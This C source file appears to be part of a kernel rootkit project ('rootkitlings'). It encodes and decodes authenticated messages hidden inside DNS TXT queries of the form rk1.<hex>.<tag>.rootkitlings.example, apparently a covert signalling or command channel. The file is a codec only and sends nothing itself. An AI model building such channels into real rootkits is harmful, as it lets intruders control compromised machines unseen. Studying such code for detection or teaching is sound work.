// SPDX-License-Identifier: GPL-2.0
#ifdef __KERNEL__
#include <linux/errno.h>
#include <linux/string.h>
#else
#include <errno.h>
#include <string.h>
#endif

#include "dns_query.h"

static const u8 prefix[] = "rk1";
static const u8 owner[] = "rootkitlings";
static const u8 suffix[] = "example";
static const char hex[] = "0123456789abcdef";

static void rk_put_be16(u8 *output, u16 value)
{
	output[0] = value >> 8;
	output[1] = value;
}

static u16 rk_get_be16(const u8 *input)
{
	return (u16)input[0] << 8 | input[1];
}

static void rk_put_label(u8 *packet, size_t *offset, const u8 *data,
			 size_t length)
{
	packet[(*offset)++] = length;
	memcpy(packet + *offset, data, length);
	*offset += length;
}

static int rk_hex_value(u8 byte)
{
	if (byte >= '0' && byte <= '9')
		return byte - '0';
	if (byte >= 'a' && byte <= 'f')
		return byte - 'a' + 10;
	return -EINVAL;
}

static int rk_read_hex(const u8 *input, size_t length, u8 *output)
{
	size_t index;

	for (index = 0; index < length / 2; index++) {
		int high = rk_hex_value(input[index * 2]);
		int low = rk_hex_value(input[index * 2 + 1]);

		if (high < 0 || low < 0)
			return -EINVAL;
		output[index] = (u8)(high << 4 | low);
	}
	return 0;
}

int rk_dns_query_encode(const u8 message[RK_AUTH_MESSAGE_LENGTH], u16 id,
			u8 *packet, size_t capacity, size_t *used)
{
	u8 candidate[RK_DNS_SIGNAL_PACKET_LENGTH] = {0};
	u8 body_hex[RK_AUTH_BODY_LENGTH * 2];
	u8 tag_hex[RK_AUTH_TAG_LENGTH * 2];
	size_t index;
	size_t offset = RK_DNS_HEADER_LENGTH;

	if (!message || !packet || !used)
		return -EINVAL;
	if (capacity < sizeof(candidate))
		return -ENOSPC;
	for (index = 0; index < RK_AUTH_BODY_LENGTH; index++) {
		body_hex[index * 2] = hex[message[index] >> 4];
		body_hex[index * 2 + 1] = hex[message[index] & 0x0f];
	}
	for (index = 0; index < RK_AUTH_TAG_LENGTH; index++) {
		u8 byte = message[RK_AUTH_BODY_LENGTH + index];

		tag_hex[index * 2] = hex[byte >> 4];
		tag_hex[index * 2 + 1] = hex[byte & 0x0f];
	}
	rk_put_be16(candidate, id);
	rk_put_be16(candidate + 2, 0x0100);
	rk_put_be16(candidate + 4, 1);
	rk_put_label(candidate, &offset, prefix, sizeof(prefix) - 1);
	rk_put_label(candidate, &offset, body_hex, sizeof(body_hex));
	rk_put_label(candidate, &offset, tag_hex, sizeof(tag_hex));
	rk_put_label(candidate, &offset, owner, sizeof(owner) - 1);
	rk_put_label(candidate, &offset, suffix, sizeof(suffix) - 1);
	candidate[offset++] = 0;
	rk_put_be16(candidate + offset, 16);
	offset += 2;
	rk_put_be16(candidate + offset, 1);
	offset += 2;
	if (offset != sizeof(candidate))
		return -EPROTO;
	memcpy(packet, candidate, sizeof(candidate));
	*used = sizeof(candidate);
	return 0;
}

int rk_dns_query_decode(const u8 *packet, size_t length,
			u8 message[RK_AUTH_MESSAGE_LENGTH], u16 *id)
{
	u8 decoded[RK_AUTH_MESSAGE_LENGTH];
	size_t offset = RK_DNS_HEADER_LENGTH;
	int error;

	if (!packet || !message || !id)
		return -EINVAL;
	if (length != RK_DNS_SIGNAL_PACKET_LENGTH)
		return -EMSGSIZE;
	if (rk_get_be16(packet + 2) != 0x0100 ||
	    rk_get_be16(packet + 4) != 1 || rk_get_be16(packet + 6) != 0 ||
	    rk_get_be16(packet + 8) != 0 || rk_get_be16(packet + 10) != 0)
		return -EPROTO;
#define RK_EXPECT_LABEL(text) do { \
	size_t rk_length = sizeof(text) - 1; \
	if (packet[offset++] != rk_length || \
	    memcmp(packet + offset, text, rk_length)) \
		return -EPROTO; \
	offset += rk_length; \
} while (0)
	RK_EXPECT_LABEL(prefix);
	if (packet[offset++] != RK_AUTH_BODY_LENGTH * 2)
		return -EPROTO;
	error = rk_read_hex(packet + offset, RK_AUTH_BODY_LENGTH * 2, decoded);
	if (error)
		return error;
	offset += RK_AUTH_BODY_LENGTH * 2;
	if (packet[offset++] != RK_AUTH_TAG_LENGTH * 2)
		return -EPROTO;
	error = rk_read_hex(packet + offset, RK_AUTH_TAG_LENGTH * 2,
			    decoded + RK_AUTH_BODY_LENGTH);
	if (error)
		return error;
	offset += RK_AUTH_TAG_LENGTH * 2;
	RK_EXPECT_LABEL(owner);
	RK_EXPECT_LABEL(suffix);
#undef RK_EXPECT_LABEL
	if (packet[offset++] != 0 || rk_get_be16(packet + offset) != 16 ||
	    rk_get_be16(packet + offset + 2) != 1 || offset + 4 != length)
		return -EPROTO;
	memcpy(message, decoded, sizeof(decoded));
	*id = rk_get_be16(packet);
	return 0;
}
